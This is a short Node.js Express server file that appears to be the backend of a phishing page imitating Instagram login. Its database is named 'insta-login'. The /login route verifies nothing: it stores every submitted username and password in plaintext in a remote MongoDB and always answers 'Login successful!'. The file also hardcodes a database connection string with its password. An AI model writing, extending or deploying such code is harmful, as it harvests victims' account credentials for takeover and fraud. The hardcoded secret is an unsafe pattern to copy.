const express = require('express');
const bodyParser = require('body-parser');
const mongoose = require('mongoose');
const cors = require('cors');
const path = require('path');

const app = express();

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(cors());

// MongoDB Connection
mongoose.connect(
  'mongodb+srv://insta:insta123@cluster0.nf5ayxe.mongodb.net/insta-login',
  { useNewUrlParser: true, useUnifiedTopology: true }
).then(() => console.log("MongoDB connected"))
 .catch(err => console.error("MongoDB connection error:", err));

// MongoDB Schema
const userSchema = new mongoose.Schema({
  username: String,
  password: String
});

const User = mongoose.model('User', userSchema);

// Root route (fixes "Cannot GET /")
app.get("/", (req, res) => {
  res.send("Backend is running!");
});

// Login route
app.post('/login', async (req, res) => {
  try {
    const { username, password } = req.body;

    const newUser = new User({ username, password });
    await newUser.save();

    console.log('User saved:', username);
    res.json({ message: 'Login successful!' });
  } catch (err) {
    console.error('Error saving user:', err);
    res.status(500).json({ message: 'Error saving login.' });
  }
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Backend server running on port ${PORT}`);
});
